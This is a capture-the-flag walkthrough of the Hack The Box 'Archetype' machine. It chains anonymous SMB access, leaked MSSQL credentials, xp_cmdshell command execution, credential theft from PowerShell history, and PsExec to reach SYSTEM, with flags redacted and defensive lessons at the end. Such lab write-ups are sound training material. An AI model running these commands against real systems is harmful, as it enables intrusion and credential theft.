# Hack The Box Archetype Walkthrough

## Machine information

- Platform: Hack The Box
- Machine: Archetype
- Difficulty: Very Easy
- OS: Windows
- Category: Starting Point

This is a public-safe walkthrough. Flags and final credentials are redacted.

## Attack chain

```text
SMB exposed
-> anonymous access to backups share
-> configuration file leaked MSSQL credentials
-> MSSQL login as sql_svc
-> sql_svc had sysadmin role
-> xp_cmdshell enabled
-> Windows command execution as sql_svc
-> PowerShell history leaked Administrator credentials
-> PsExec used with Administrator credentials
-> SYSTEM shell
```

## 1. Enumeration

```bash
sudo nmap -p- $TARGET
```

Interesting ports:

```text
445/tcp   SMB
1433/tcp  Microsoft SQL Server
5985/tcp  WinRM
```

SMB was a good first target because Windows shares often expose backup or configuration files.

## 2. SMB enumeration

```bash
smbclient -L //$TARGET -U guest%
```

The non-administrative share was:

```text
backups
```

Connect to it:

```bash
smbclient //$TARGET/backups -U guest%
```

Download the configuration file:

```text
smb: \> get prod.dtsConfig
```

The file contained MSSQL credentials for `ARCHETYPE\sql_svc`.

## 3. MSSQL access

```bash
mssqlclient.py ARCHETYPE/sql_svc:'REDACTED_PASSWORD'@$TARGET -windows-auth
```

Useful MSSQL commands:

```sql
SELECT name FROM sys.databases;
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

The account was a SQL Server sysadmin.

## 4. xp_cmdshell

Enable command execution:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Test OS command execution:

```sql
EXEC xp_cmdshell 'whoami';
```

Result:

```text
archetype\sql_svc
```

## 5. User flag

```sql
EXEC xp_cmdshell 'type C:\Users\sql_svc\Desktop\user.txt';
```

Result:

```text
[REDACTED_USER_FLAG]
```

## 6. Privilege escalation

After getting command execution as `sql_svc`, enumerate the user profile before rushing to exploits.

```sql
EXEC xp_cmdshell 'dir C:\Users\sql_svc';
EXEC xp_cmdshell 'dir C:\Users\sql_svc\Desktop';
EXEC xp_cmdshell 'dir C:\Users\sql_svc\Documents';
```

Check PowerShell history:

```sql
EXEC xp_cmdshell 'type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt';
```

The history contained a previous command using Administrator credentials. This was the privilege escalation path.

## 7. PsExec

Use the discovered Administrator credentials with Impacket PsExec:

```bash
psexec.py administrator:'REDACTED_ADMIN_PASSWORD'@$TARGET
```

Check the shell:

```cmd
whoami
```

Expected:

```text
nt authority\system
```

Read the root flag:

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

Result:

```text
[REDACTED_ROOT_FLAG]
```

## Defensive lessons

- Disable anonymous access to SMB shares.
- Do not store plaintext credentials in configuration files.
- Apply least privilege to service accounts.
- Restrict SQL Server sysadmin privileges.
- Monitor `sp_configure` and `xp_cmdshell` usage.
- Avoid typing passwords directly in PowerShell commands.
- Protect or clear PowerShell history.
- Use LAPS or Windows LAPS for local Administrator passwords.
- Monitor remote service creation, especially Event ID 7045.

## Key takeaway

The most important lesson is not `xp_cmdshell` itself. The real lesson is methodology.

After getting command execution, loot the current user's profile manually before relying on automated tools. In this case, PowerShell history was more valuable than WinPEAS.
